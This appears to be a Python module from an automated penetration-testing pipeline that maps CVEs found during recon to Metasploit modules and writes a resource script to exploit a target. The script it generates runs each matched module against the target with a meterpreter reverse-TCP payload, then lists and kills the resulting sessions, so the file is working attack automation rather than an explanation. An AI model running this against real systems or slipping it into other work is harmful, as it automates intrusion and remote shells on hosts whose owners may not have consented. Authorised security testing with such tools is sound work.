import os
import json
from cve import extract_services
from msf_module_matcher import suggest_module
from exploit import validate_module

def load_cves(run_path):
    f = os.path.join(run_path, "cve_summary.json")
    return json.load(open(f)) if os.path.exists(f) else {}

def load_context(run_path):
    f = os.path.join(run_path, "recon.txt")
    if os.path.exists(f):
        return ", ".join(extract_services(open(f).read()))
    return ""

def map_cves_to_exploits(cves, context):
    result = {}
    for cve_id in list(cves.keys())[:10]:
        match = suggest_module(cve_id, context)
        result[cve_id] = {
            "module": match.get("module"),
            "reason": match.get("reason"),
            "valid": validate_module(match.get("module")) if match.get("module") else False
        }
    return result

def save_map(mapping, run_path):
    with open(os.path.join(run_path, "cve2exploit_map.json"), "w") as f:
        json.dump(mapping, f, indent=2)

def generate_rc(mapping, target, run_path):
    lines = []
    for entry in mapping.values():
        if entry["valid"]:
            lines.extend([
                f"use {entry['module']}",
                f"set RHOSTS {target}",
                "set LHOST 127.0.0.1",
                "set LPORT 4444",
                "set PAYLOAD linux/x86/meterpreter_reverse_tcp",
                "run"
            ])
    if lines:
        lines += ["sleep 4", "sessions -l", "sessions -K", "exit"]
        with open(os.path.join(run_path, "cve2exploit.rc"), "w") as f:
            f.write("\n".join(lines))

def run(target, run_path):
    cves = load_cves(run_path)
    if not cves:
        print("[!] No CVEs found.")
        return
    context = load_context(run_path)
    mapping = map_cves_to_exploits(cves, context)
    save_map(mapping, run_path)
    generate_rc(mapping, target, run_path)
    print(f"[âœ“] Mapping saved: cve2exploit_map.json (+ .rc if valid)")

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        exit(1)
    run(t, p)

